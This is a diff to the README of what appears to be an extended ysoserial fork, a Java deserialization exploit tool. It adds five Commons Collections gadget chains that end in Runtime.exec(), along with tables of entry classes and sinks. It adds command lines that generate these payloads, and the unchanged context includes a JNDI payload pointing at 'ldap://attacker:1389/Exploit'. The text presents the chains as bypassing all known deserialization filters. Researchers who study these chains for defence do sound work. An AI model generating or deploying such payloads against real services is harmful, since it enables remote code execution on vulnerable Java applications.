@@ -20,6 +20,11 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | `PriorityBlockingQueue` | CC17 ‡, CB6 ‡, CBJndi4 ‡ | Concurrent variant of PriorityQueue — filters check PQ by exact class name |
 | `DualHashBidiMap` | CC18 ‡, CCJndi3 ‡, CCSSRF ‡, CCSleep ‡, CCDNS ‡, CCFileWrite ‡, CCProcessBuilder ‡, ROME6 ‡, Hibernate4 ‡ | BidiMap family — never in any filter list |
 | `DualTreeBidiMap` | CC21 ‡, CB7 ‡, CBJndi5 ‡ | BidiMap with TreeMap internals — Comparator dispatch |
+| `HashedMap` | CC28 ‡ | AbstractHashedMap subclass — custom readObject triggers hashCode via addMapping() |
+| `LRUMap` | CC29 ‡ | Cache Map (AbstractHashedMap) — common in real apps, never in any filter |
+| `DefaultedMap` | CC30 ‡ | LazyMap sibling decorator — same pattern, different class name |
+| `TransformedMap` | CC31 ‡ | Original CC1 paper root — dropped from ysoserial, forgotten by filters |
+| `ListOrderedMap` | CC32 ‡ | Insertion-order decorator — readObject calls put() → hashCode |
 | `HashBag` | CC24 ‡ | Bag type entry — not Map/Set/Queue, completely novel class family |
 | `CaseInsensitiveMap` | CC26 ‡ | **toString dispatch** — novel mechanism, not hashCode/compare |
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
@@ -81,6 +86,11 @@ Discovered via **IOCD static analysis** (bytecode scanning for source→link→s
 | `CC21` ‡ | `DualTreeBidiMap` | compare | InstantiateTransformer → `TemplatesImpl` | CC4 |
 | `CC24` ‡ | `HashBag` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
 | `CC26` ‡ | `CaseInsensitiveMap` | **toString** | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC28` ‡ | `HashedMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC29` ‡ | `LRUMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC30` ‡ | `DefaultedMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC31` ‡ | `TransformedMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC32` ‡ | `ListOrderedMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
 | `CB7` ‡ | `DualTreeBidiMap` | compare | BeanComparator → `TemplatesImpl` | CB |
 | `CBJndi5` ‡ | `DualTreeBidiMap` | compare | BeanComparator → JNDI | CB |
 | `CCJndi3` ‡ | `DualHashBidiMap` | hashCode | ChainedTransformer → `doLookup()` | CC3 |
@@ -161,6 +171,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `CommonsCollections15` | @zema1, @su18 | LinkedHashSet + InstantiateTransformer — double evasion (root + sink) |
 | `CommonsCollections16` | @dmbs335 ‡ | ConcurrentSkipListMap + InstantiateTransformer — novel entry point, 5x filter bypass |
 | `CommonsCollections18`/`21`/`24`/`26` | @dmbs335 ‡ | IOCD-discovered — see [IOCD section](#iocd-discovered-chains-static-analysis--fuzzer) |
+| `CommonsCollections28`–`32` | @dmbs335 ‡ | Fuzzer-discovered alt roots (HashedMap/LRUMap/DefaultedMap/TransformedMap/ListOrderedMap) — see [IOCD section](#iocd-discovered-chains-static-analysis--fuzzer) |
 | `CommonsBeanutils5` | @dmbs335 ‡ | ConcurrentSkipListMap + BeanComparator — no CC dependency on target |
 | `CommonsBeanutils7` | @dmbs335 ‡ | DualTreeBidiMap + BeanComparator → TemplatesImpl — BidiMap entry |
 | `CommonsBeanutilsJndi3` | @dmbs335 ‡ | ConcurrentSkipListMap + JNDI — JDK 17+ friendly, no CC, no TemplatesImpl |
@@ -193,7 +204,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `JRMPListener` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <payload> <cmd>` |
 | `RMIRegistryExploit` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <payload> <cmd>` |
 
-## All Payloads (98 total)
+## All Payloads (103 total)
 
 ```
 Payload                Authors                                Dependencies
@@ -243,6 +254,11 @@ CommonsCollections18   @dmbs335 ‡                             commons-collecti
 CommonsCollections21   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollections24   @dmbs335 ‡                             commons-collections:3.1
 CommonsCollections26   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections28   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections29   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections30   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections31   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections32   @dmbs335 ‡                             commons-collections:3.1
 CommonsCollectionsJndi @mbechler                              commons-collections:3.1
 CommonsCollectionsJndi2 @dmbs335 †                            commons-collections:3.1, commons-collections4:4.0
 CommonsCollectionsDNS  @dmbs335 ‡                             commons-collections:3.1
@@ -375,6 +391,13 @@ java -jar ysoserial.jar ROMEJndi2 'ldap://attacker:1389/Exploit' > payload.bin
 
 # IOCD-discovered: DualHashBidiMap entry — never in any filter
 java -jar ysoserial.jar CommonsCollections18 'calc.exe' > payload.bin
+
+# Fuzzer-discovered alt roots: AbstractHashedMap family — bypasses all known filters
+java -jar ysoserial.jar CommonsCollections28 'calc.exe' > payload.bin  # HashedMap
+java -jar ysoserial.jar CommonsCollections29 'calc.exe' > payload.bin  # LRUMap (common in caches)
+java -jar ysoserial.jar CommonsCollections30 'calc.exe' > payload.bin  # DefaultedMap
+java -jar ysoserial.jar CommonsCollections31 'calc.exe' > payload.bin  # TransformedMap (OG CC1 root)
+java -jar ysoserial.jar CommonsCollections32 'calc.exe' > payload.bin  # ListOrderedMap
 
 # IOCD-discovered: toString dispatch via CaseInsensitiveMap (novel mechanism)
 java -jar ysoserial.jar CommonsCollections26 'calc.exe' > payload.bin
